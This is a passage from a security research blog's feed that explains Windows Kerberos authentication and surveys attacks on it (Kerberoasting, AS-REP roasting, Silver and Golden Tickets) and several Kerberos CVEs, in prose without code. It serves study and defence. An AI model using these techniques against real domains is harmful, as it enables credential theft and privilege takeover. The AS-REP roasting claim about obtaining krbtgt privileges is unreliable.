(client-service server) and a service ticket (ST).</p><p>The service ticket is encrypted with the secret key of the service account (the NTLM hash of the service account), so only the <strong>service</strong> can decrypt and view it, the client does not know the contents. The client will keep this ST and use it to access the actual service.</p><p><strong>5) AP-REQ</strong></p><p>Finally, the client tries to connect by presenting the AP-REQ to the target server (service) with the service ticket. To prove its identity, the client also sends the authenticator (Authenticator, timestamp, etc.) encrypted with the service session key it received earlier.</p><p>The server sends a KERB_VERIFY_PAC message to the domain controller to validate the signature of the PAC in the service ticket. This PAC is protected by the KDC&#x2019;s signature, and the service verifies the integrity of the PAC when validating the ticket so that it can trust the user&#x2019;s authorization in the domain.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/3.png" alt></p><p><strong>6) AP-REP</strong> </p><p>The service server verifies the PAC of the service ticket presented by the client, and if the verification is successful, the server sends a response to the client in an AP-REP message to complete the session key negotiation. The client is then allowed to access the service.</p><hr><p>As you can see from the description, Kerberos authentication on Windows is based on the fact that the secret key shared with each other is the user&#x2019;s NTLM hash, the authorization information, called the PAC, is contained in the ticket, and the PAC is signed by the KDC to ensure its integrity.</p><h1 id="Kerberos-related-attacks"><a href="#Kerberos-related-attacks" class="headerlink" title="Kerberos-related attacks"></a>Kerberos-related attacks</h1><p>The Kerberos protocol itself is designed to be secure, but various attack techniques have been studied depending on the implementation settings and operating environment. Let&#x2019;s take a look at the most common attacks in the Windows Kerberos environment.</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>Kerberoasting is an attack technique that uses a legitimate domain user account to request a Kerberos ticket for a <strong>service account</strong> and then cracks the encrypted information contained in the ticket to steal the service account&#x2019;s password.</p><p>Any user inside an AD domain can request a service ticket via TGS-REQ for an account with an SPN attribute, which means that an attacker can use this technique if they have already penetrated the domain.</p><p>The service ticket is encrypted with an NTLM hash, so if the crack is successful, the NTLM hash is obtained, which is no different than obtaining a password in a Windows environment.</p><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p><strong>AS-REP Roasting</strong> is a technique similar to Kerberoasting, but targets users who have Kerberos Pre-Authentication disabled.</p><p>Pre-authentication is the process of verifying that the client knows the shared key before a TGT is issued.</p><p>If the option &#x201C;Do not require Kerberos pre-authentication&#x201D; is set in the AD account properties, TGTs are issued without pre-authentication, meaning that a password is not required to obtain a TGT.</p><p>The TGT is encrypted with the master key of the KDC, which is the NTLM hash of the krbtgt account, so if you successfully crack the TGT, you can take over the privileges of the krbtgt account.</p><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>If you have the NTLM hash of a specific service account, you can use it to create another service ticket that manipulates the PAC.</p><p>Service tickets are originally issued by TGS, but it is possible to create service tickets without going through TGS.</p><p>The PAC in the service ticket is signed with two keys: the service account secret key and the krbtgt account secret key, but in some cases, only the service account secret key signature is verified.</p><p>For example, an account with the SeTcbPrivilege privilege is eligible for a Silver Ticket because only the service account secret key signature is verified.</p><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>Once you have the NTLM hash of the krbtgt account, you can create a TGT. This TGT also contains a PAC, and while the Silver Ticket manipulated the PAC of the service ticket, the Golden Ticket manipulates the PAC of the TGT.</p><p>When the TGT with the manipulated PAC is delivered to the TGS, the service ticket is issued with the corresponding privilege, so it can be used to elevate to higher privileges, such as domain administrator.</p><h1 id="Kerberos-related-vulnerabilities"><a href="#Kerberos-related-vulnerabilities" class="headerlink" title="Kerberos-related vulnerabilities"></a>Kerberos-related vulnerabilities</h1><p>The Kerberos protocol is very complex and it is difficult to introduce all the related features implemented in Windows. Therefore, let&#x2019;s take a look at a few CVEs to understand the details and the vulnerabilities that occurred.</p><h2 id="CVE-2020-17049"><a href="#CVE-2020-17049" class="headerlink" title="CVE-2020-17049"></a>CVE-2020-17049</h2><p>CVE-2020-17049 is a security vulnerability found in the Kerberos Delegation mechanism, known as a &#x201C;Bronze Bit&#x201D; attack.</p><p>Delegation is literally a delegation. For example, let&#x2019;s say a user authenticates to a web application, and the web application needs to access a database based on the user&#x2019;s permissions. There are several implementations of Kerberos Delegation to support this (Unconstrained Delegation, Constrained Delegation, Do Not Delegate, etc.)</p><p>The AllowedToDelegateTo property, which specifies the services that can be delegated to, is used to store information that a service A can delegate to another service B. This is called the Forwardable Flag in the service ticket.</p><p>The Forwardable Flag in a service ticket is a bit that indicates whether this ticket is relayable, and if Forwardable is 1, it means that the authorization can be delegated. So if the Kerberos Delegation option is Do Not Delegate or AllowedToDelegateTo is not defined, Forwardable is 0.</p><p>But the Forwardable bit is not protected by the KDC&#x2019;s signature, the service&#x2019;s signature, or anything else, so it can be tampered with.</p><p>At this point, do you have any idea what this CVE is?</p><p>If you manipulate the Forwardable Flag in a service ticket and send it to a service, you can force the service to delegate privileges even if it is not delegating privileges, which can lead to a privilege takeover.</p><p>In Windows, Kerberos Contained Delegation (MS-SFU) implements authorization delegation with the S4U2proxy protocol. If service A is delegated to service B, it is impossible to make a request to service B using only A&#x2019;s service ticket. You need to present the A service ticket to the KDC via S4U2proxy and get the B service ticket.</p><p>This is a vulnerability that can be exploited by setting the Forwardable flag to 1 to force delegation of authorization.</p><h2 id="CVE-2022-33647-amp-CVE-2022-33679"><a href="#CVE-2022-33647-amp-CVE-2022-33679" class="headerlink" title="CVE-2022-33647 &amp; CVE-2022-33679"></a>CVE-2022-33647 &amp; CVE-2022-33679</h2><p><strong>CVE-2022-33647</strong> and <strong>CVE-2022-33679</strong> are vulnerabilities discovered by James Forshaw of Google&#x2019;s Project Zero that allow the use of RC4 encryption during the Kerberos authentication process, which can be used to decrypt session keys and gain privileges using methods such as brute force. The vulnerability trigger forces the use of RC4 because Kerberos natively prefers AES-based encryption but supports the RC4-HMAC (MD4) method due to backward compatibility.</p><p>When a client passes an AS-REQ to a KDC, it can use an integer field called etype to specify the supported encryption algorithms. The server will check for supported ciphers and, if available, will use the cipher specified by the client.</p><p>The idea Forshaw used to exploit CVE-2022-33647 is amazing, let&#x2019;s take a look:</p><p>When a client authenticates, it typically sends a request to the KDC without a pre-authentication timestamp. The KDC then returns with an error code called KDC_ERR_PREAUTH_REQUIRED. This error response includes a list of required ciphers so that the client can perform the appropriate encryption. MITM intercepts the client&#x2019;s AS-REQ and returns an error, and includes information about RC4-MD4 in the error to force the client to use RC4-MD4. Relay the RC4-enabled AS-REQ to the KDC to receive the AS-REP.</p><p>Now, the attacker has the RC4-enabled AS-REQ and the encrypted session key and TGT contained in the AS-REP. The AS-REQ has a timestamped structure called PA-ENC-TS-ENC, and the AS-REP has an encrypted response structure called EncASRepPart.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/4.png" alt></p><p>RC4 does an XOR with the generated stream key, so if you know the ciphertext and the plaintext, you know the stream key. This is computable except when both sides are yellow in the above figure:</p><ul><li>The RC4-MD4 method generates and uses a 16-byte key, where only the first 5 bytes are random and the 11th byte is fixed at 0xAB.</li></ul><p>The green markings are values we know or can compute because they are ASN.1 structures. We&#x2019;re lucky enough to have about 4 bytes of the session key overlap, so we can decrypt it, and 1 byte needs to be brute-forced. Bruteforcing can be done by requesting a service ticket from the KDC 256 times to get a legitimate service ticket.  This allows him to obtain the session key, decrypt the ticket, and take over the user&#x2019;s privileges.</p><p>The case of CVE-2022-33679 occurs when pre-authentication in Keberos is disabled. If an account has pre-authentication disabled, an attacker can send an AS-REQ request directly to the KDC for that account to request a TGT over RC4-MD4. Because pre-authentication is turned off, the KDC will return the RC4-encrypted TGT and session key via AS-REP even though the user has not proven their password.</p><p>To exploit this vulnerability, instead of obtaining the session key, we use oracle padding to append a null value to the back of the timestamp and obtain the key if the KDC responds with a valid response.</p><h2 id="CVE-2022-37966"><a href="#CVE-2022-37966" class="headerlink" title="CVE-2022-37966"></a>CVE-2022-37966</h2><p>CVE-2022-37966 is a vulnerability announced at Black Hat Europe 2022 that allows verification bypass via MD5 collision after PAC tampering when using the RC4_HMAC_MD5 algorithm, which was natively supported in Kerberos at the time.</p><p>There is no controllable field in the PAC that can be used to insert arbitrary bytes, but the LogonScript field can be used to insert a long UTF-16 string, which can be used to trigger an MD5 collision.</p><p>To exploit this vulnerability, you need to create a PAC with domain administrator privileges that has the same MD5 hash, which in our research took about 7 hours with HashClash. Once created, you can get domain administrator privileges, so it seems to be worth the time.</p><h2 id="CVE-2024-43639"><a href="#CVE-2024-43639" class="headerlink" title="CVE-2024-43639"></a>CVE-2024-43639</h2><p>CVE-2024-43639 is a vulnerability reported to ZDI, which is a Heap Overflow vulnerability due to Integer Overflow in KDC Proxy (kdcsvc).</p><p>Windows KDC Proxy is a Windows Server component that proxies Kerberos protocol messages over HTTP. It occurs in kpssvc.dll, which runs a service called kdcsvc.</p><p>I&#x2019;ve been looking at Kerberos protocol logical bugs all the time, so it&#x2019;s kind of refreshing to see a memory corruption bug.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><strong>Conclusion</strong></h1><p>We&#x2019;ve covered how Kerberos works, the Windows implementation, and related attacks and vulnerabilities. Kerberos is a strong authentication protocol, but misconfigurations and implementation gaps can expose it to a variety of attacks and vulnerabilities. The topic for the next installment is still undecided, but we&#x2019;ll be back with something interesting. Thanks for reading &#x1F642;</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><p><a href="https://en.wikipedia.org/wiki/Kerberos_(protocol">https://en.wikipedia.org/wiki/Kerberos_(protocol)</a>)</p></li><li><p><a href="https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication">https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication</a></p></li><li><p><a href="https://www.varonis.com/blog/kerberos-attack-silver-ticket">https://www.varonis.com/blog/kerberos-attack-silver-ticket</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8">https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos">https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos</a></p></li><li><p><a href="https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/">https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/</a></p></li><li><p><a href="https://www.hackthebox.com/blog/as-rep-roasting-detection">https://www.hackthebox.com/blog/as-rep-roasting-detection</a></p></li><li><p><a href="https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/">https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/</a></p></li><li><p><a href="https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html">https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html</a></p></li><li><p><a href="https://syfuhs.net/a-bit-about-kerberos">https://syfuhs.net/a-bit-about-kerberos</a></p></li><li><p><a href="https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf">https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf</a></p></li><li><p><a href="https://www.thehacker.recipes/ad/movement/kerberos/">https://www.thehacker.recipes/ad/movement/kerberos/</a></p></li><li><p><a href="https://en.hackndo.com/kerberos-silver-golden-tickets/">https://en.hackndo.com/kerberos-silver-golden-tickets/</a></p></li><li><p><a href="https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/">https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview">https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview</a></p></li><li><p><a href="https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/">https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926</a></p></li><li><p><a href="https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639">https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/Authentication/">Authentication</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kerberos/">Kerberos</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Authentication Series (Part2. Kerberos)(KR)</title>
      <link>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/ko/</link>
      <guid>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/ko/</guid>
      <pubDate>Mon, 21 Apr 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. Windows Authentication Series &#xB85C; &#xB2E4;&#xC2DC; &#xCC3E;&#xC544;&#xBD59;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Part1 NTLM &#xB54C;&#xB294; Part2 &#xB54C; NTLM &#xAD00;&#xB828; CVE &#xB97C; &#xC0B4;&#xD3B4;&#xBCFC; &#xC608;&#xC815;&#xC774;&#xB77C;&#xACE0; &#xD588;&#xC5C8;&#xB294;&#xB370;&#xC694;. NTLM &#xAD00;&#xB828; CVE&#xB97C; &#xB2E4;&#xB8E8;&#xB294; &#xAC83;&#xB3C4; &#xC88B;&#xC9C0;&#xB9CC; Windows &#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Kerberos &#xC778;&#xC99D; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBA3C;&#xC800; &#xB2E4;&#xB904;&#xBD10;&#xC57C;&#xACA0;&#xB2E4; &#xC2F6;&#xC5B4;&#xC11C; &#xB0B4;&#xC6A9;&#xC744; &#xC900;&#xBE44;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Kerberos &#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC791;&#xB3D9; &#xC6D0;&#xB9AC;&#xBD80;&#xD130; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xAD6C;&#xD604; &#xBC29;&#xC2DD;, Kerberos &#xAD00;&#xB828; &#xACF5;&#xACA9;&#xACFC; &#xAD00;&#xB828; CVE &#xCDE8;&#xC57D;&#xC810; &#xBA87; &#xC885;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xAC00;&#xC838;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Kerberos-&#xC778;&#xC99D;"><a href="#Kerberos-&#xC778;&#xC99D;" class="headerlink" title="Kerberos &#xC778;&#xC99D;"></a>Kerberos &#xC778;&#xC99D;</h1><p>Kerberos &#xB294; &#xD2F0;&#xCF13; &#xAE30;&#xBC18;&#xC758; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC740; KDC &#xB97C; &#xD1B5;&#xD574; &#xB300;&#xCE6D; &#xD0A4; &#xC554;&#xD638;&#xD654; &#xAE30;&#xBC18;&#xC758; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC790;&#xCCB4;&#xB97C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB178;&#xCD9C;&#xD558;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790;&#xC640; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC0C1;&#xD638; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xAC8C; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC778;&#xC99D; &#xAD6C;&#xC870;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC694;&#xC18C;&#xAC00; &#xB4F1;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>KDC (Key Distribution Center): &#xD0A4; &#xBC30;&#xD3EC; &#xC13C;&#xD130;, AS &#xC640; TGS &#xB97C; &#xBB36;&#xC740; &#xC694;&#xC18C;&#xB85C; &#xC778;&#xC99D; &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5; &#xBC0F; &#xC138;&#xC158;&#xD0A4; &#xC0DD;&#xC131;, &#xBD84;&#xBC30;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>AS (Authentication Server): &#xC778;&#xC99D; &#xC11C;&#xBC84;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; TGS&#xC758; &#xBE44;&#xBC00;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C; TGT&#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.</li><li>TGS (Ticket Granting Server): &#xD2F0;&#xCF13; &#xBD80;&#xC5EC; &#xC11C;&#xBC84;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; TGT&#xB97C; TGS &#xC5D0; &#xBCF4;&#xB0B4;&#xBA74; ST &#xC640; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.</li><li>TGT (Ticket Granting Ticket): &#xD2F0;&#xCF13; &#xBD80;&#xC5EC; &#xD2F0;&#xCF13;, TGS &#xC5D0;&#xC11C; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xD2F0;&#xCF13;&#xC785;&#xB2C8;&#xB2E4;.</li><li>ST (Service Ticket): &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC774;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xD2F0;&#xCF13;&#xC785;&#xB2C8;&#xB2E4;.</li><li>SS (Service Server): &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p>Kerberos &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; AS &#xC5D0; &#xC778;&#xC99D; &#xC694;&#xCCAD;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</li><li>AS &#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; TGT &#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.<ol><li>&#xC774; &#xB54C;, TGT&#xB294; TGS &#xC758; &#xBE44;&#xBC00;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654; &#xB429;&#xB2C8;&#xB2E4;.</li><li>AS, TGS &#xB294; KDC&#xB85C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xAC19;&#xC740; &#xD638;&#xC2A4;&#xD2B8;&#xB97C; &#xACF5;&#xC720;&#xD569;&#xB2C8;&#xB2E4;.</li></ol></li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00;  TGT &#xC640; &#xC694;&#xCCAD;&#xD560; &#xC11C;&#xBE44;&#xC2A4;&#xC758; ID &#xB97C; TGS &#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>TGS &#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; ST &#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.<ol><li>&#xC774; &#xB54C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC811;&#xADFC; &#xC694;&#xCCAD;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB294; SPN (Service Principal Name) &#xC73C;&#xB85C; TGS&#xC5D0; &#xB4F1;&#xB85D;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li></ol></li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; ST&#xB97C; &#xC11C;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD1B5;&#xC2E0;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704; &#xACFC;&#xC815;&#xC744; &#xB3C4;&#xC2DD;&#xD654;&#xD55C; &#xADF8;&#xB9BC;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/1.png" alt></p><h2 id="Windows&#xC5D0;&#xC11C;&#xC758;-Kerberos-&#xC778;&#xC99D;"><a href="#Windows&#xC5D0;&#xC11C;&#xC758;-Kerberos-&#xC778;&#xC99D;" class="headerlink" title="Windows&#xC5D0;&#xC11C;&#xC758; Kerberos &#xC778;&#xC99D;"></a>Windows&#xC5D0;&#xC11C;&#xC758; Kerberos &#xC778;&#xC99D;</h2><p>Windows Kerberos &#xAD6C;&#xD604;&#xC5D0;&#xC11C;&#xB294; &#xD2F0;&#xCF13;&#xC5D0; PAC (Privilege Attribute Certificate) &#xB77C;&#xB294;&#xAC8C; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. PAC &#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xADF8;&#xB8F9; &#xC815;&#xBCF4;&#xC640; &#xAD8C;&#xD55C; &#xB370;&#xC774;&#xD130; &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294;&#xB370;&#xC694;. KDC&#xAC00; &#xC774; &#xC815;&#xBCF4;&#xB97C; &#xC11C;&#xBA85;&#xD558;&#xC5EC; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;&#xB294; &#xD2F0;&#xCF13;&#xC774; &#xC624;&#xBA74; PAC&#xB97C; &#xBCF4;&#xACE0; &#xAD8C;&#xD55C;&#xC744; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xC811;&#xADFC;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xAC70;&#xB098; &#xAC70;&#xBD80;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xC790;, Windows &#xC5D0;&#xC11C;&#xB294; &#xC704;&#xC5D0;&#xC11C; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xD55C; Kerberos &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC744; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xCC98;&#xB7FC; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;. </p><p>&#xBA38;&#xB9AC;&#xAC00; &#xC544;&#xD504;&#xC9C0;&#xB9CC; &#xD558;&#xB098;&#xD558;&#xB098; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/2.png" alt></p><p><strong>1) AS-REQ</strong></p><p>AS-REQ &#xC5D0;&#xC11C;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; KDC &#xC758; &#xC778;&#xC99D; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC790;&#xC2E0;&#xC758; ID&#xB85C; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. Windows &#xAE30;&#xBCF8; &#xC124;&#xC815; &#xC0C1;, &#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD604;&#xC7AC; &#xC2DC;&#xAC01;&#xC744; &#xC790;&#xC2E0;&#xC758; &#xBE44;&#xBC00;&#xD0A4; (NTLM hash) &#xB85C; &#xC554;&#xD638;&#xD654;&#xD558;&#xC5EC; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. KDC&#xB294; DC(Domain Controller) &#xC5D0; &#xBCF4;&#xAD00;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; NTLM hash &#xB85C; &#xC774;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC778;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>2) AS-REP</strong> </p><p>AS-REQ &#xC5D0;&#xC11C; &#xAC80;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; AS-REP &#xC751;&#xB2F5;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; <strong>TGT&#xC640; &#xC138;&#xC158;&#xD0A4;(&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-TGS)</strong> &#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;. &#xC138;&#xC158;&#xD0A4;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; NTLM hash&#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xBA70; TGT&#xB294; <strong>KDC&#xC758; &#xB9C8;&#xC2A4;&#xD130; &#xD0A4; (krbtgt &#xACC4;&#xC815;&#xC758; NTLM hash)</strong> &#xB85C; &#xC554;&#xD638;&#xD654; &#xB418;&#xC5B4; &#xC788;&#xAE30;&#xC5D0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; TGT&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>3) TGS-REQ</strong> </p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xD544;&#xC694;&#xD560; &#xB54C; TGT &#xB97C; TGS-REQ 